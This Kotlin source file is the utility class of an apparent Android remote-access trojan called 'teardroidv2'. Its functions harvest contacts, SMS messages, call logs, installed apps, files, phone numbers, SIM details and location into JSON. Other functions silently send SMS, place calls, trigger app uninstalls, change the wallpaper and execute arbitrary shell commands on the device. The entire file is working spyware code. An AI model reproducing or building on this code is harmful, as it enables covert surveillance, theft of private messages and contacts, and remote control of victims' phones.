package com.example.teardroidv2

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.app.WallpaperManager
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import com.google.gson.Gson
import com.squareup.picasso.Picasso
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.lang.Long
import java.util.*
import java.util.concurrent.TimeUnit
import kotlin.collections.ArrayList
import kotlin.collections.HashMap
import Request
import android.app.Service
import android.telephony.SubscriptionManager


open class Utility(mContext: Context) {
    private val gson = Gson()
    val context = mContext

    @SuppressLint("HardwareIds", "MissingPermission")
    fun addClient(): JSONObject {
        Request.init(context)
        val client = JSONObject()
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?
        val androidVersion = Build.VERSION.RELEASE
        val deviceName = Build.MODEL
        val countryiso: String = telephonyManager!!.simCountryIso
        val simOperatorName: String = telephonyManager!!.simOperatorName
        client.put("android_version",androidVersion)
        client.put("device_name",deviceName)
        client.put("sim_country",countryiso)
        client.put("sim_operator",simOperatorName)
        return client
    }

    @SuppressLint("Recycle", "Range")
    open fun getContact(): String {
        val hashMap : HashMap<String, String> = HashMap()
        val resolver: ContentResolver = context.contentResolver
        val cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null,
            null)

        if (cursor!!.count > 0) {
            while (cursor.moveToNext()) {
                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                val phoneNumber = (cursor.getString(
                    cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))).toInt()

                if (phoneNumber > 0) {
                    val cursorPhone = resolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", arrayOf(id), null)

                    if(cursorPhone!!.count > 0) {
                        while (cursorPhone.moveToNext()) {
                            val phoneNumValue = cursorPhone.getString(
                                cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            hashMap[name] = phoneNumValue
                        }
                    }
                    cursorPhone.close()
                }
            }
        } else {
            val error = "{\"error\":\"No contact found!\"}"
            return gson.toJson(error)
        }
        cursor.close()
        return jsonify(hashMap,"contact")
    }

    @SuppressLint("QueryPermissionsNeeded")
    open fun installedApps(): String {
        val apps = ArrayList<String>()
        val packages = context.packageManager.getInstalledApplications(0)

        for (packageInfo in packages) {
           apps.add(packageInfo.packageName)
        }
        return "{\"installed_apps\":"+ gson.toJson(apps) +"}"
    }

    @SuppressLint("Recycle")
    open fun getSms(): String {
        val sms = ArrayList<String>()
        val cursor: Cursor =
            context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null,
                null,
                null,
                "date DESC"
            )!!
        val filterJunk =
            arrayOf("address", "date", "date_sent", "read", "seen", "subject", "body", "account")
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            var count = 0
            do {
                val smsdata = JSONObject()
                for (idx in 0 until cursor.columnCount) {
                    if (cursor.getColumnName(idx).toString() in filterJunk) {
                        smsdata.put(cursor.getColumnName(idx).toString(),cursor.getString(idx)?.toString() ?: "null")
                    }
                }
                sms.add(smsdata.toString())
                count += 1
            } while (cursor.moveToNext() && count < 500)
        }else {
            return "{\"sms\":[]}"
        }
        return "{\"sms\":$sms}"
    }

    open fun sendSMS(phoneNumber: String, message: String): String {
        val sentPI: PendingIntent = PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"), PendingIntent.FLAG_IMMUTABLE)
        SmsManager.getDefault().sendTextMessage(phoneNumber, null, message, sentPI, null)
        return "{\"success\":true}"
    }

    open fun makeCall(number:String): String {
        val intent = Intent(Intent.ACTION_CALL)
        intent.data = Uri.parse("tel:$number")
        context.startActivity(intent)
        return "{\"success\":true}"
    }

    open fun getCallLogs(): String {
        val callLogsBuffer = ArrayList<HashMap<String, String>>()
        callLogsBuffer.clear()
        val managedCursor: Cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, "date DESC"
        )!!
        val number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER)
        val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
        val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
        val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
        while (managedCursor.moveToNext()) {
            val hashMap: HashMap<String, String> = HashMap<String, String>()
            val phNumber = managedCursor.getString(number)
            val callType = managedCursor.getString(type)
            val callDate = managedCursor.getString(date)
            val callDayTime = Date(Long.valueOf(callDate))
            val callDuration = managedCursor.getString(duration)
            var dir: String? = null
            when (callType.toInt()) {
                CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
            }
            hashMap["Number"] = phNumber
            hashMap["Type"] = dir.toString()
            hashMap["Date"] = callDayTime.toString()
            hashMap["duration in sec"] = callDuration
            callLogsBuffer.add(hashMap)
        }
        managedCursor.close()
        return jsonify(callLogsBuffer,"call_logs")
    }

    fun getFiles(path: String=AppInfo.DeviceBaseFolder): String {
        // Log.d(AppInfo.TAG, context.getExternalFilesDir(null).toString())
        var newpath = ""
        newpath = if (path != AppInfo.DeviceBaseFolder){
            AppInfo.DeviceBaseFolder + path
        }else{
            AppInfo.DeviceBaseFolder
        }
        val files = File(newpath).listFiles()
        val fileNames = arrayOfNulls<String>(files.size)
        files?.mapIndexed { index, item ->
            fileNames[index] = item?.name
        }
        return "{\"files\":"+ gson.toJson(fileNames) +"}"
    }

    fun uninstallApplication(packageName:String): String {
        val intent = Intent(Intent.ACTION_DELETE)
        intent.data = Uri.parse("package:$packageName")
        context.startActivity(intent)
        return "{\"success\":true}"
    }

    open fun getServices(): String {
        val services = ArrayList<String>()
        val process = runCommand("service list")
        var returnValue = process.toString().split("\n")
        val totalService = returnValue[0].dropLast(1)
        returnValue = returnValue.drop(1)
        returnValue.forEach { service ->
            try{
                services.add(service.split("\t").drop(1).first())
            }catch (e:NoSuchElementException){
                Log.d(AppInfo.TAG,service)
            }

        }
        return "{\"total_services\": \""+totalService+"\",\"services\":"+ gson.toJson(services) +"}"
    }


    open fun runCommand(command:String,workingDir: File=File(AppInfo.DeviceBaseFolder)): String? {
        return try {
            val parts = command.split("\\s".toRegex())
            if (command.startsWith("findx:")){
                val all_file = find_ext(AppInfo.DeviceBaseFolder,command.replace("findx:",""))
                return all_file.toString()
            }
            if (command.startsWith("findphno")){
                val number = getNumber(context)
                return number
            }
            val proc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ProcessBuilder(*parts.toTypedArray())
                    .directory(workingDir)
                    .redirectOutput(ProcessBuilder.Redirect.PIPE)
                    .redirectError(ProcessBuilder.Redirect.PIPE)
                    .start()
            } else {
                return "{\"error\":\"this function is not supported for this version of android\"}"
            }

            proc.waitFor(60, TimeUnit.MINUTES)
            proc.inputStream.bufferedReader().readText()
        } catch(e: Exception) {
            Log.d(AppInfo.TAG,e.toString())
            return "{\"error\":\"${e.toString()}\"}"
        }
    }

    open fun find_ext(dir: String,ext:String): java.util.ArrayList<String> {
        val fucked_lst = arrayListOf<String>()
        File(dir).walk().forEach {
            if (it.toString().endsWith(ext.trim())){
                fucked_lst.add(it.path.toString())
            }
        }
        return fucked_lst
    }

    @SuppressLint("HardwareIds", "MissingPermission")
    open fun getNumber(context: Context): String {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                val subscriptionManager =
                    SubscriptionManager.from(context)
                val subsInfoList = subscriptionManager.activeSubscriptionInfoList
                return when (subsInfoList.size) {
                    1 -> {
                        subsInfoList[0].number
                    }
                    2 -> {
                        subsInfoList[0].number + "x" + subsInfoList[1].number
                    }
                    else -> {
                        Log.d(
                            AppInfo.TAG,
                            "Phone number not found 1 => " + subsInfoList.size
                        )
                        Log.d(AppInfo.TAG, "Phone number not found 1")
                        "null"
                    }
                }
            } catch (e: Exception) {
                Log.d(AppInfo.TAG, "Phone number not found 2 => $e")
                return "null"
            }
        }
        return "null"
    }


    open fun changeWallpaper(imageURL:String):String {
        val thread = Thread {
            val result :Bitmap = Picasso.get().load(imageURL).get()
            val wallpaperManager = WallpaperManager.getInstance(context)
            try {
                wallpaperManager.setBitmap(result)
            } catch (ex: IOException) {
                ex.printStackTrace()
            }
        }
        thread.start()
        return "{\"success\":true}"
    }

    open fun getLocation(): String {
        val geoLocation = geoLocation(context)
        val location = geoLocation.getLocation()
        return jsonify(location,"location")
    }


    private fun jsonify(contentArray: ArrayList<HashMap<String, String>>, key:String):String {
        return "{" + "\""+key+"\":"+ gson.toJson(contentArray) +"}"
    }

    private fun jsonify(hashMap: HashMap<String, String>,key:String):String {
        return "{" + "\""+key+"\":"+ gson.toJson(hashMap) +"}"
    }
}



